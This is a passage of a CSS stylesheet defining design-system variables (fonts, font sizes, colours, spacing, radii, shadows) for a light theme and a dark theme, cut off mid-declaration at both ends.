Grotesk; --stamp-text-price-s-default-letter-spacing: 0px; --stamp-text-price-s-default-font-size: 19px; --stamp-text-price-s-default-line-height: 1.05; --stamp-text-price-s-default-font-weight: 800; --stamp-text-price-s-default-font-family: Hanken Grotesk; --stamp-text-price-m-decimal-letter-spacing: 0px; --stamp-text-price-m-decimal-font-size: 25px; --stamp-text-price-m-decimal-line-height: 1.05; --stamp-text-price-m-decimal-font-weight: 800; --stamp-text-price-m-decimal-font-family: Hanken Grotesk; --stamp-text-price-m-default-letter-spacing: 0px; --stamp-text-price-m-default-font-size: 25px; --stamp-text-price-m-default-line-height: 1.05; --stamp-text-price-m-default-font-weight: 800; --stamp-text-price-m-default-font-family: Hanken Grotesk; --stamp-text-price-l-decimal-letter-spacing: 0px; --stamp-text-price-l-decimal-font-size: 33px; --stamp-text-price-l-decimal-line-height: 1.05; --stamp-text-price-l-decimal-font-weight: 800; --stamp-text-price-l-decimal-font-family: Hanken Grotesk; --stamp-text-price-l-default-letter-spacing: 0px; --stamp-text-price-l-default-font-size: 33px; --stamp-text-price-l-default-line-height: 1.05; --stamp-text-price-l-default-font-weight: 800; --stamp-text-price-l-default-font-family: Hanken Grotesk; --stamp-text-body-s-emphasis-letter-spacing: 0px; --stamp-text-body-s-emphasis-font-size: 14px; --stamp-text-body-s-emphasis-line-height: 1.6; --stamp-text-body-s-emphasis-font-weight: 700; --stamp-text-body-s-emphasis-font-family: Hanken Grotesk; --stamp-text-body-s-default-letter-spacing: 0px; --stamp-text-body-s-default-font-size: 14px; --stamp-text-body-s-default-line-height: 1.6; --stamp-text-body-s-default-font-weight: 400; --stamp-text-body-s-default-font-family: Hanken Grotesk; --stamp-text-body-m-emphasis-letter-spacing: 0px; --stamp-text-body-m-emphasis-font-size: 16px; --stamp-text-body-m-emphasis-line-height: 1.6; --stamp-text-body-m-emphasis-font-weight: 700; --stamp-text-body-m-emphasis-font-family: Hanken Grotesk; --stamp-text-body-m-default-letter-spacing: 0px; --stamp-text-body-m-default-font-size: 16px; --stamp-text-body-m-default-line-height: 1.6; --stamp-text-body-m-default-font-weight: 400; --stamp-text-body-m-default-font-family: Hanken Grotesk; --stamp-text-body-l-emphasis-letter-spacing: 0px; --stamp-text-body-l-emphasis-font-size: 19px; --stamp-text-body-l-emphasis-line-height: 1.6; --stamp-text-body-l-emphasis-font-weight: 700; --stamp-text-body-l-emphasis-font-family: Hanken Grotesk; --stamp-text-body-l-default-letter-spacing: 0px; --stamp-text-body-l-default-font-size: 19px; --stamp-text-body-l-default-line-height: 1.6; --stamp-text-body-l-default-font-weight: 400; --stamp-text-body-l-default-font-family: Hanken Grotesk; --stamp-text-subtitle-s-letter-spacing: 0px; --stamp-text-subtitle-s-font-size: 18px; --stamp-text-subtitle-s-line-height: 1.2; --stamp-text-subtitle-s-font-weight: 500; --stamp-text-subtitle-s-font-family: Hanken Grotesk; --stamp-text-subtitle-m-letter-spacing: 0px; --stamp-text-subtitle-m-font-size: 19px; --stamp-text-subtitle-m-line-height: 1.2; --stamp-text-subtitle-m-font-weight: 500; --stamp-text-subtitle-m-font-family: Hanken Grotesk; --stamp-text-subtitle-l-letter-spacing: 0px; --stamp-text-subtitle-l-font-size: 24px; --stamp-text-subtitle-l-line-height: 1.2; --stamp-text-subtitle-l-font-weight: 500; --stamp-text-subtitle-l-font-family: Hanken Grotesk; --stamp-text-heading-xxs-letter-spacing: 0px; --stamp-text-heading-xxs-font-size: 14px; --stamp-text-heading-xxs-line-height: 1.05; --stamp-text-heading-xxs-font-weight: 500; --stamp-text-heading-xxs-font-family: Hanken Grotesk; --stamp-text-heading-xs-letter-spacing: 0px; --stamp-text-heading-xs-font-size: 16px; --stamp-text-heading-xs-line-height: 1.2; --stamp-text-heading-xs-font-weight: 700; --stamp-text-heading-xs-font-family: Hanken Grotesk; --stamp-text-heading-s-letter-spacing: 0px; --stamp-text-heading-s-font-size: 18px; --stamp-text-heading-s-line-height: 1.05; --stamp-text-heading-s-font-weight: 700; --stamp-text-heading-s-font-family: ABC ROM; --stamp-text-heading-m-letter-spacing: 0px; --stamp-text-heading-m-font-size: 21px; --stamp-text-heading-m-line-height: 1.05; --stamp-text-heading-m-font-weight: 700; --stamp-text-heading-m-font-family: ABC ROM; --stamp-text-heading-l-letter-spacing: -0.5px; --stamp-text-heading-l-font-size: 25px; --stamp-text-heading-l-line-height: 0.95; --stamp-text-heading-l-font-weight: 700; --stamp-text-heading-l-font-family: ABC ROM; --stamp-text-heading-xl-letter-spacing: -1px; --stamp-text-heading-xl-font-size: 32px; --stamp-text-heading-xl-line-height: 0.9; --stamp-text-heading-xl-font-weight: 700; --stamp-text-heading-xl-font-family: ABC ROM; --stamp-text-heading-xxl-letter-spacing: -1.5px; --stamp-text-heading-xxl-font-size: 40px; --stamp-text-heading-xxl-line-height: 0.9; --stamp-text-heading-xxl-font-weight: 700; --stamp-text-heading-xxl-font-family: ABC ROM; --stamp-text-heading-3-xl-letter-spacing: -1.5px; --stamp-text-heading-3-xl-font-size: 54px; --stamp-text-heading-3-xl-line-height: 0.9; --stamp-text-heading-3-xl-font-weight: 700; --stamp-text-heading-3-xl-font-family: ABC ROM; --stamp-drop-shadow-block-start: 0px -2px 8px #1f1e2f26; --stamp-drop-shadow-flyout-down: 0px 2px 8px #1f1e2f26; --stamp-color-overflow-block-end: linear-gradient(180deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-block-start: linear-gradient(180deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-overflow-inline-end: linear-gradient(90deg, #ffffff00 0%, #ffffff 100%); --stamp-color-overflow-inline-start: linear-gradient(90deg, #ffffff 0%, #ffffff00 100%); --stamp-color-icon-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-icon-button-secondary-pressed: #001a73; --stamp-color-icon-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-icon-button-primary-pressed: #ffffff; --stamp-color-icon-icon-button-primary-default: #ffffff; --stamp-color-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-button-secondary-pressed: #001a73; --stamp-color-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-button-primary-pressed: #ffffff; --stamp-color-icon-button-primary-default: #ffffff; --stamp-color-icon-accent-inverse: #1f1e2f; --stamp-color-icon-accent-default: #ffffff; --stamp-color-icon-disabled: #bec0cb; --stamp-color-icon-selected: #e75204; --stamp-color-icon-pressed: #001a73; --stamp-color-icon-hover: #4e4ee2; --stamp-color-icon-negative: #ee3261; --stamp-color-icon-warning: #fdd732; --stamp-color-icon-positive: #00BB53; --stamp-color-icon-informative: #009ee3; --stamp-color-icon-sustainable: #00BB53; --stamp-color-icon-on-brand: #ffffff; --stamp-color-icon-subtle: #86889d; --stamp-color-icon-switch-active-disabled: #bec0cb; --stamp-color-icon-switch-active-hover: #4e4ee2; --stamp-color-icon-switch-active-strong: #e75204; --stamp-color-icon-switch-normal-disabled: #bec0cb; --stamp-color-icon-switch-normal-hover: #4e4ee2; --stamp-color-icon-switch-normal-strong: #1f1e2f; --stamp-color-icon-strong: #1f1e2f; --stamp-color-icon-brand: #e75204; --stamp-color-icon-default: #4e4ee2; --stamp-color-border-button-tertiary-pressed: #ffffff00; --stamp-color-border-button-tertiary-default: #ffffff00; --stamp-color-border-button-secondary-pressed: #001a73; --stamp-color-border-button-secondary-default: #6161ff; --stamp-color-border-button-primary-pressed: #ffffff00; --stamp-color-border-button-primary-default: #ffffff00; --stamp-color-border-fallback: #ffffff00; --stamp-color-border-focus-outline: #001a73; --stamp-color-border-disabled: #bec0cb; --stamp-color-border-error: #d70036; --stamp-color-border-selected: #e75204; --stamp-color-border-pressed: #001a73; --stamp-color-border-hover: #6161ff; --stamp-color-border-negative: #ee3261; --stamp-color-border-warning: #fdd732; --stamp-color-border-positive: #00BB53; --stamp-color-border-informative: #009ee3; --stamp-color-border-strong: #67687f; --stamp-color-border-brand: #e75204; --stamp-color-border-default: #bec0cb; --stamp-color-background-badge-brand: #D83D00; --stamp-color-background-badge-important: #d70036; --stamp-color-background-badge-secondary: #e7e8eb; --stamp-color-background-badge-primary: #6161ff; --stamp-color-background-app-brand: #D83D00; --stamp-color-background-app-default: #f1f1f2; --stamp-color-background-segment-selected: #6161ff; --stamp-color-background-segment-default: #ffffff00; --stamp-color-background-icon-button-tertiary-pressed: #ffffff00; --stamp-color-background-icon-button-tertiary-default: #ffffff00; --stamp-color-background-icon-button-secondary-pressed: #e7e8eb; --stamp-color-background-icon-button-secondary-default: #f1f1f2; --stamp-color-background-icon-button-primary-pressed: #001a73; --stamp-color-background-icon-button-primary-default: #6161ff; --stamp-color-background-date-input-today-disabled: #bec0cb; --stamp-color-background-date-input-today-default: #67687f; --stamp-color-background-date-input-date-disabled: #f1f1f2; --stamp-color-background-date-input-date-range: #ffede0; --stamp-color-background-date-input-date-default: #ffffff; --stamp-color-background-data-list-selected: #ffffff00; --stamp-color-background-data-list-pressed: #f1f1f2; --stamp-color-background-data-list-hover: #f1f1f2; --stamp-color-background-data-list-default: #ffffff00; --stamp-color-background-card-brand-red-accent: #ba2a0f; --stamp-color-background-card-brand-red-default: #d23416; --stamp-color-background-card-brand-green-accent: #004728; --stamp-color-background-card-brand-green-default: #005e35; --stamp-color-background-card-brand-blue-accent: #4e4ee2; --stamp-color-background-card-brand-blue-default: #6161ff; --stamp-color-background-card-brand-dark-blue-accent: #001252; --stamp-color-background-card-brand-dark-blue-default: #001a73; --stamp-color-background-card-brand-orange-accent: #C23400; --stamp-color-background-card-brand-orange-default: #D83D00; --stamp-color-background-card-inverse-accent: #ffffff; --stamp-color-background-card-inverse-default: #ffffff; --stamp-color-background-card-neutral-accent: #e7e8eb; --stamp-color-background-card-neutral-default: #f1f1f2; --stamp-color-background-button-tertiary-pressed: #ffffff00; --stamp-color-background-button-tertiary-default: #ffffff00; --stamp-color-background-button-secondary-pressed: #ffffff00; --stamp-color-background-button-secondary-default: #ffffff00; --stamp-color-background-button-primary-pressed: #001a73; --stamp-color-background-button-primary-default: #6161ff; --stamp-color-background-switch-button-active-disabled: #f1f1f2; --stamp-color-background-switch-button-active-default: #ffffff; --stamp-color-background-switch-button-normal-disabled: #f1f1f2; --stamp-color-background-switch-button-normal-default: #ffffff; --stamp-color-background-switch-normal-disabled: #bec0cb; --stamp-color-background-switch-normal-default: #86889d; --stamp-color-background-switch-active-disabled: #bec0cb; --stamp-color-background-switch-active-default: #e75204; --stamp-color-background-disabled: #f1f1f2; --stamp-color-background-negative: #ee32611a; --stamp-color-background-warning: #fdd7321a; --stamp-color-background-positive: #00bb531a; --stamp-color-background-informative: #009ee31a; --stamp-color-background-notification: #d70036; --stamp-color-background-inverse: #1f1e2f; --stamp-color-background-subtle: #dddee3; --stamp-color-background-strong: #86889d; --stamp-color-background-brand-deep: #D83D00; --stamp-color-background-brand-subtle: #e75204; --stamp-color-background-brand: #f56900; --stamp-color-background-variant: #f1f1f2; --stamp-color-background-default: #e7e8eb; --stamp-color-background-surface: #ffffff; --stamp-color-text-segment-selected: #ffffff; --stamp-color-text-segment-default: #4e4ee2; --stamp-color-text-link-visited: #d05aff; --stamp-color-text-link-pressed: #001a73; --stamp-color-text-link-hover: #4e4ee2; --stamp-color-text-link-on-brand: #ffffff; --stamp-color-text-link-subtle: #1f1e2f; --stamp-color-text-link-default: #4e4ee2; --stamp-color-text-icon-button-pressed: #001a73; --stamp-color-text-icon-button-default: #4e4ee2; --stamp-color-text-form-control-placeholder-disabled: #bec0cb; --stamp-color-text-form-control-placeholder-default: #67687f; --stamp-color-text-form-control-value-disabled: #86889d; --stamp-color-text-form-control-value-default: #1f1e2f; --stamp-color-text-date-input-today-disabled: #ffffff; --stamp-color-text-date-input-today-selected: #ffffff; --stamp-color-text-date-input-today-default: #ffffff; --stamp-color-text-date-input-date-disabled: #bec0cb; --stamp-color-text-date-input-date-selected: #1f1e2f; --stamp-color-text-date-input-date-pressed: #001a73; --stamp-color-text-date-input-date-hover: #4e4ee2; --stamp-color-text-date-input-date-subtle: #bec0cb; --stamp-color-text-date-input-date-strong: #1f1e2f; --stamp-color-text-date-input-date-default: #4e4ee2; --stamp-color-text-button-tertiary-pressed: #001a73; --stamp-color-text-button-tertiary-default: #4e4ee2; --stamp-color-text-button-secondary-pressed: #001a73; --stamp-color-text-button-secondary-default: #4e4ee2; --stamp-color-text-button-primary-pressed: #ffffff; --stamp-color-text-button-primary-default: #ffffff; --stamp-color-text-negative: #d70036; --stamp-color-text-positive: #008005; --stamp-color-text-inverse: #ffffff; --stamp-color-text-on-brand: #ffffff; --stamp-color-text-subtle: #67687f; --stamp-color-text-brand: #D83D00; --stamp-color-text-default: #1f1e2f; --stamp-color-heading-on-brand: #ffffff; --stamp-color-heading-subtle: #1f1e2f; --stamp-color-heading-brand: #e75204; --stamp-color-heading-default: #001a73; }

.stamp-theme-dark { --stamp-opacity-illustration-disabled: 60%; --stamp-opacity-illustration-default: 100%; --stamp-opacity-mix-subtle: 10%; --stamp-opacity-mix-strong: 90%; --stamp-opacity-mix-default: 30%; --stamp-opacity-backdrop: 60%; --stamp-blend-mode-disabled: Luminosity; --stamp-blend-mode-default: Normal; --stamp-border-width-l: 4px; --stamp-border-width-m: 2px; --stamp-border-width-s: 1px; --stamp-border-width-xs: 0.5px; --stamp-radius-xxl: 32px; --stamp-radius-xl: 24px; --stamp-radius-l: 16px; --stamp-radius-m: 8px; --stamp-radius-s: 6px; --stamp-radius-xs: 4px; --stamp-radius-xxs: 2px; --stamp-size-medium-illustration-m: 240px; --stamp-size-medium-illustration-s: 204px; --stamp-size-illustration-3-xl: 144px; --stamp-size-illustration-xxl: 120px; --stamp-size-illustration-xl: 96px; --stamp-size-illustration-l: 88px; --stamp-size-illustration-m: 80px; --stamp-size-illustration-s: 56px; --stamp-size-icon-l: 40px; --stamp-size-icon-m: 24px; --stamp-size-icon-s: 16px; --stamp-spacing-outer-xl: 88px; --stamp-spacing-outer-l: 56px; --stamp-spacing-outer-m: 40px; --stamp-spacing-outer-s: 24px; --stamp-spacing-outer-xs: 16px; --stamp-spacing-inner-4-xl: 56px; --stamp-spacing-inner-3-xl: 40px; --stamp-spacing-inner-xxl: 32px; --stamp-spacing-inner-xl: 24px; --stamp-spacing-inner-l: 16px; --stamp-spacing-inner-m: 12px; --stamp-spacing-inner-s: 8px; --stamp-spacing-inner-xs: 4px; --stamp-spacing-inner-xxs: 2px; --stamp-text-app-navigation-selected-letter-spacing: 0px; --stamp-text-app-navigation-selected-font-size: 12px; --stamp-text-app-navigation-selected-line-height: 1.6; --stamp-text-app-navigation-selected-font-weight: 700; --stamp-text-app-navigation-selected-font-family: Hanken Grotesk; --stamp-text-app-navigation-default-letter-spacing: 0px; --stamp-text-app-navigation-default-font-size: 12px; --stamp-text-app-navigation-default-line-height: 1.6; --stamp-text-app-navigation-default-font-weight: 400; --stamp-text-app-navigation-default-font-family: Hanken Grotesk; --stamp-text-step-todo-letter-spacing: 0px; --stamp-text-step-todo-font-size: 16px; --stamp-text-step-todo-line-height: 1.6; --stamp-text-step-todo-font-weight: 400; --stamp-text-step-todo-font-family: Hanken Grotesk; --stamp-text-step-default-letter-spacing: 0px; --stamp-text-step-default-font-size: 16px; --stamp-text-step-default-line-height: 1.6; --stamp-text-step-default-font-weight: 400; --stamp-text-step-default-font-family: Hanken Grotesk; --stamp-text-badge-default-letter-spacing: 0px; --stamp-text-badge-default-font-size: 14px; --stamp-text-badge-default-line-height: 1.05; --stamp-text-badge-default-font-weight: 400; --stamp-text-badge-default-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-selected-letter-spacing: 0px; --stamp-text-form-date-input-date-selected-font-size: 18px; --stamp-text-form-date-input-date-selected-line-height: 1.4; --stamp-text-form-date-input-date-selected-font-weight: 700; --stamp-text-form-date-input-date-selected-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-pressed-text-decoration: underline; --stamp-text-form-date-input-date-pressed-letter-spacing: 0px; --stamp-text-form-date-input-date-pressed-font-size: 18px; --stamp-text-form-date-input-date-pressed-line-height: 1.4; --stamp-text-form-date-input-date-pressed-font-weight: 400; --stamp-text-form-date-input-date-pressed-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-hover-text-decoration: underline; --stamp-text-form-date-input-date-hover-letter-spacing: 0px; --stamp-text-form-date-input-date-hover-font-size: 18px; --stamp-text-form-date-input-date-hover-line-height: 1.4; --stamp-text-form-date-input-date-hover-font-weight: 400; --stamp-text-form-date-input-date-hover-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-default-letter-spacing: 0px; --stamp-text-form-date-input-date-default-font-size: 18px; --stamp-text-form-date-input-date-default-line-height: 1.4; --stamp-text-form-date-input-date-default-font-weight: 400; --stamp-text-form-date-input-date-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-body-highlighted-text-decoration: underline; --stamp-text-form-data-list-body-highlighted-font-size: 14px; --stamp-text-form-data-list-body-highlighted-line-height: 1.6; --stamp-text-form-data-list-body-highlighted-font-weight: 400; --stamp-text-form-data-list-body-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-pressed-letter-spacing: 0px; --stamp-text-form-data-list-body-pressed-font-size: 14px; --stamp-text-form-data-list-body-pressed-line-height: 1.6; --stamp-text-form-data-list-body-pressed-font-weight: 400; --stamp-text-form-data-list-body-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-hover-letter-spacing: 0px; --stamp-text-form-data-list-body-hover-font-size: 14px; --stamp-text-form-data-list-body-hover-line-height: 1.6; --stamp-text-form-data-list-body-hover-font-weight: 400; --stamp-text-form-data-list-body-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-default-letter-spacing: 0px; --stamp-text-form-data-list-body-default-font-size: 14px; --stamp-text-form-data-list-body-default-line-height: 1.6; --stamp-text-form-data-list-body-default-font-weight: 400; --stamp-text-form-data-list-body-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-title-highlighted-text-decoration: underline; --stamp-text-form-data-list-title-highlighted-font-size: 16px; --stamp-text-form-data-list-title-highlighted-line-height: 1.4; --stamp-text-form-data-list-title-highlighted-font-weight: 700; --stamp-text-form-data-list-title-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-pressed-letter-spacing: 0px; --stamp-text-form-data-list-title-pressed-font-size: 16px; --stamp-text-form-data-list-title-pressed-line-height: 1.4; --stamp-text-form-data-list-title-pressed-font-weight: 700; --stamp-text-form-data-list-title-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-hover-letter-spacing: 0px; --stamp-text-form-data-list-title-hover-font-size: 16px; --stamp-text-form-data-list-title-hover-line-height: 1.4; --stamp-text-form-data-list-title-hover-font-weight: 700; --stamp-text-form-data-list-title-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-default-letter-spacing: 0px; --stamp-text-form-data-list-title-default-font-size: 16px; --stamp-text-form-data-list-title-default-line-height: 1.4; --stamp-text-form-data-list-title-default-font-weight: 700; --stamp-text-form-data-list-title-default-font-family: Hanken Grotesk; --stamp-text-form-feedback-letter-spacing: 0px; --stamp-text-form-feedback-font-size: 14px; --stamp-text-form-feedback-line-height: 1.4; --stamp-text-form-feedback-font-weight: 700; --stamp-text-form-feedback-font-family: Hanken Grotesk; --stamp-text-form-label-letter-spacing: 0px; --stamp-text-form-label-font-size: 16px; --stamp-text-form-label-line-height: 1.2; --stamp-text-form-label-font-weight: 700; --stamp-text-form-label-font-family: Hanken Grotesk; --stamp-text-hyperlink-pressed-letter-spacing: 0px; --stamp-text-hyperlink-pressed-text-decoration: underline; --stamp-text-hyperlink-pressed-font-size: 16px; --stamp-text-hyperlink-pressed-line-height: 1.6; --stamp-text-hyperlink-pressed-font-weight: 400; --stamp-text-hyperlink-pressed-font-family: Hanken Grotesk; --stamp-text-hyperlink-hover-letter-spacing: 0px; --stamp-text-hyperlink-hover-text-decoration: underline; --stamp-text-hyperlink-hover-font-size: 16px; --stamp-text-hyperlink-hover-line-height: 1.6; --stamp-text-hyperlink-hover-font-weight: 400; --stamp-text-hyperlink-hover-font-family: Hanken Grotesk; --stamp-text-hyperlink-default-letter-spacing: 0px; --stamp-text-hyperlink-default-text-decoration: underline; --stamp-text-hyperlink-default-font-size: 16px; --stamp-text-hyperlink-default-line-height: 1.6; --stamp-text-hyperlink-default-font-weight: 400; --stamp-text-hyperlink-default-font-family: Hanken Grotesk; --stamp-text-link-s-pressed-text-decoration: underline; --stamp-text-link-s-pressed-letter-spacing: 0px; --stamp-text-link-s-pressed-font-size: 14px; --stamp-text-link-s-pressed-line-height: 1.6; --stamp-text-link-s-pressed-font-weight: 400; --stamp-text-link-s-pressed-font-family: Hanken Grotesk; --stamp-text-link-s-hover-text-decoration: underline; --stamp-text-link-s-hover-letter-spacing: 0px; --stamp-text-link-s-hover-font-size: 14px; --stamp-text-link-s-hover-line-height: 1.6; --stamp-text-link-s-hover-font-weight: 400; --stamp-text-link-s-hover-font-family: Hanken Grotesk; --stamp-text-link-s-default-letter-spacing: 0px; --stamp-text-link-s-default-font-size: 14px; --stamp-text-link-s-default-line-height: 1.6; --stamp-text-link-s-default-font-weight: 400; --stamp-text-link-s-default-font-family: Hanken Grotesk; --stamp-text-link-m-pressed-text-decoration: underline; --stamp-text-link-m-pressed-letter-spacing: 0px; --stamp-text-link-m-pressed-font-size: 16px; --stamp-text-link-m-pressed-line-height: 1.6; --stamp-text-link-m-pressed-font-weight: 400; --stamp-text-link-m-pressed-font-family: Hanken Grotesk; --stamp-text-link-m-hover-text-decoration: underline; --stamp-text-link-m-hover-letter-spacing: 0px; --stamp-text-link-m-hover-font-size: 16px; --stamp-text-link-m-hover-line-height: 1.6; --stamp-text-link-m-hover-font-weight: 400; --stamp-text-link-m-hover-font-family: Hanken Grotesk; --stamp-text-link-m-default-letter-spacing: 0px; --stamp-text-link-m-default-font-size: 16px; --stamp-text-link-m-default-line-height: 1.6; --stamp-text-link-m-default-font-weight: 400; --stamp-text-link-m-default-font-family: Hanken Grotesk; --stamp-text-link-l-pressed-letter-spacing: 0px; --stamp-text-link-l-pressed-font-size: 16px; --stamp-text-link-l-pressed-text-decoration: underline; --stamp-text-link-l-pressed-line-height: 1.4; --stamp-text-link-l-pressed-font-weight: 700; --stamp-text-link-l-pressed-font-family: Hanken Grotesk; --stamp-text-link-l-hover-letter-spacing: 0px; --stamp-text-link-l-hover-font-size: 16px; --stamp-text-link-l-hover-text-decoration: underline; --stamp-text-link-l-hover-line-height: 1.4; --stamp-text-link-l-hover-font-weight: 700; --stamp-text-link-l-hover-font-family: Hanken Grotesk; --stamp-text-link-l-default-letter-spacing: 0px; --stamp-text-link-l-default-font-size: 16px; --stamp-text-link-l-default-line-height: 1.4; --stamp-text-link-l-default-font-weight: 700; --stamp-text-link-l-default-font-family: Hanken Grotesk; --stamp-text-cta-pressed-letter-spacing: 0px; --stamp-text-cta-pressed-font-size: 16px; --stamp-text-cta-pressed-text-decoration: underline; --stamp-text-cta-pressed-line-height: 1.4; --stamp-text-cta-pressed-font-weight: 700; --stamp-text-cta-pressed-font-family: Hanken Grotesk; --stamp-text-cta-hover-letter-spacing: 0px; --stamp-text-cta-hover-font-size: 16px; --stamp-text-cta-hover-text-decoration: underline; --stamp-text-cta-hover-line-height: 1.4; --stamp-text-cta-hover-font-weight: 700; --stamp-text-cta-hover-font-family: Hanken Grotesk; --stamp-text-cta-default-letter-spacing: 0px; --stamp-text-cta-default-font-size: 16px; --stamp-text-cta-default-line-height: 1.4; --stamp-text-cta-default-font-weight: 700; --stamp-text-cta-default-font-family: Hanken Grotesk; --stamp-text-price-xs-default-letter-spacing: 0px; --stamp-text-price-xs-default-font-size: 16px; --stamp-text-price-xs-default-line-height: 1.05; --stamp-text-price-xs-default-font-weight: 800; --stamp-text-price-xs-default-font-family: Hanken Grotesk; --stamp-text-price-s-decimal-letter-spacing: 0px; --stamp-text-price-s-decimal-font-size: 19px; --stamp-text-price-s-decimal-line-height: 1.05; --stamp-text-price-s-decimal-font-weight: 800; --stamp-text-price-s-decimal-font-family: Hanken Grotesk; --stamp-text-price-s-default-letter-spacing: 0px; --stamp-text-price-s-default-font-size: 19px; --stamp-text-price-s-default-line-height: 1.05; --stamp-text-price-s-default-font-weight: 800; --stamp-text-price-s-default-font-family: Hanken Grotesk; --stamp-text-price-m-decimal-letter-spacing: 0px; --stamp-text-price-m-decimal-font-size: 25px; --stamp-text-price-m-decimal-line-height: 1.05; --stamp-text-price-m-decimal-font-weight: 800; --stamp-text-price-m-decimal-font-family: Hanken Grotesk; --stamp-text-price-m-default-letter-spacing: 0px; --stamp-text-price-m-default-font-size: 25px; --stamp-text-price-m-default-line-height: 1.05; --stamp-text-price-m-default-font-weight: 800; --stamp-text-price-m-default-font-family: Hanken Grotesk; --stamp-text-price-l-decimal-letter-spacing: 0px; --stamp-text-price-l-decimal-font-size: 33px; --stamp-text-price-l-decimal-line-height: 1.05; --stamp-text-price-l-decimal-font-weight: 800; --stamp-text-price-l-decimal-font-family: Hanken Grotesk; --stamp-text-price-l-default-letter-spacing: 0px; --stamp-text-price-l-default-font-size: 33px; --stamp-text-price-l-default-line-height: 1.05; --stamp-text-price-l-default-font-weight: 800; --stamp-text-price-l-default-font-family: Hanken Grotesk; --stamp-text-body-s-emphasis-letter-spacing: 0px; --stamp-text-body-s-emphasis-font-size: 14px; --stamp-text-body-s-emphasis-line-height: 1.6; --stamp-text-body-s-emphasis-font-weight: 700; --stamp-text-body-s-emphasis-font-family: Hanken Grotesk; --stamp-text-body-s-default-letter-spacing: 0px; --stamp-text-body-s-default-font-size: 14px; --stamp-text-body-s-default-line-height: 1.6; --stamp-text-body-s-default-font-weight: 400; --stamp-text-body-s-default-font-family: Hanken Grotesk; --stamp-text-body-m-emphasis-letter-spacing: 0px; --stamp-text-body-m-emphasis-font-size: 16px; --stamp-text-body-m-emphasis-line-height: 1.6; --stamp-text-body-m-emphasis-font-weight: 700; --stamp-text-body-m-emphasis-font-family: Hanken Grotesk; --stamp-text-body-m-default-letter-spacing: 0px; --stamp-text-body-m-default-font-size: 16px; --stamp-text-body-m-default-line-height: 1.6; --stamp-text-body-m-default-font-weight: 400; --stamp-text-body-m-default-font-family: Hanken Grotesk; --stamp-text-body-l-emphasis-letter-spacing: 0px; --stamp-text-body-l-emphasis-font-size: 19px; --stamp-text-body-l-emphasis-line-height: 1.6; --stamp-text-body-l-emphasis-font-weight: 700; --stamp-text-body-l-emphasis-font-family: Hanken Grotesk; --stamp-text-body-l-default-letter-spacing: 0px; --stamp-text-body-l-default-font-size: 19px; --stamp-text-body-l-default-line-height: 1.6; --stamp-text-body-l-default-font-weight: 400; --stamp-text-body-l-default-font-family: Hanken Grotesk; --stamp-text-subtitle-s-letter-spacing: 0px; --stamp-text-subtitle-s-font-size: 18px; --stamp-text-subtitle-s-line-height: 1.2; --stamp-text-subtitle-s-font-weight: 500; --stamp-text-subtitle-s-font-family: Hanken Grotesk; --stamp-text-subtitle-m-letter-spacing: 0px; --stamp-text-subtitle-m-font-size: 19px; --stamp-text-subtitle-m-line-height: 1.2; --stamp-text-subtitle-m-font-weight: 500; --stamp-text-subtitle-m-font-family: Hanken Grotesk; --stamp-text-subtitle-l-letter-spacing: 0px; --stamp-text-subtitle-l-font-size: 24px; --stamp-text-subtitle-l-line-height: 1.2; --stamp-text-subtitle-l-font-weight: 500; --stamp-text-subtitle-l-font-family: Hanken Grotesk; --stamp-text-heading-xxs-letter-spacing: 0px; --stamp-text-heading-xxs-font-size: 14px; --stamp-text-heading-xxs-line-height: 1.05; --stamp-text-heading-xxs-font-weight: 500; --stamp-text-heading-xxs-font-family: Hanken Grotesk; --stamp-text-heading-xs-letter-spacing: 0px; --stamp-text-heading-xs-font-size: 16px; --stamp-text-heading-xs-line-height: 1.2; --stamp-text-heading-xs-font-weight: 700; --stamp-text-heading-xs-font-family: Hanken Grotesk; --stamp-text-heading-s-letter-spacing: 0px; --stamp-text-heading-s-font-size: 18px; --stamp-text-heading-s-line-height: 1.05; --stamp-text-heading-s-font-weight: 700; --stamp-text-heading-s-font-family: ABC ROM; --stamp-text-heading-m-letter-spacing: 0px; --stamp-text-heading-m-font-size: 21px; --stamp-text-heading-m-line-height: 1.05; --stamp-text-heading-m-font-weight: 700; --stamp-text-heading-m-font-family: ABC ROM; --stamp-text-heading-l-letter-spacing: -0.5px; --stamp-text-heading-l-font-size: 25px; --stamp-text-heading-l-line-height: 0.95; --stamp-text-heading-l-font-weight: 700; --stamp-text-heading-l-font-family: ABC ROM; --stamp-text-heading-xl-letter-spacing: -1px; --stamp-text-heading-xl-font-size: 32px; --stamp-text-heading-xl-line-height: 0.9; --stamp-text-heading-xl-font-weight: 700; --stamp-text-heading-xl-font-family: ABC ROM; --stamp-text-heading-xxl-letter-spacing: -1.5px; --stamp-text-heading-xxl-font-size: 40px; --stamp-text-heading-xxl-line-height: 0.9; --stamp-text-heading-xxl-font-weight: 700; --stamp-text-heading-xxl-font-family: ABC ROM; --stamp-text-heading-3-xl-letter-spacing: -1.5px; --stamp-text-heading-3-xl-font-size: 54px; --stamp-text-heading-3-xl-line-height: 0.9; --stamp-text-heading-3-xl-font-weight: 700; --stamp-text-heading-3-xl-font-family: ABC ROM; --stamp-drop-shadow-block-start: 0px -2px 8px #1f1e2fd9; --stamp-drop-shadow-flyout-down: 0px 2px 8px #1f1e2fd9; --stamp-color-overflow-block-end: linear-gradient(180deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-block-start: 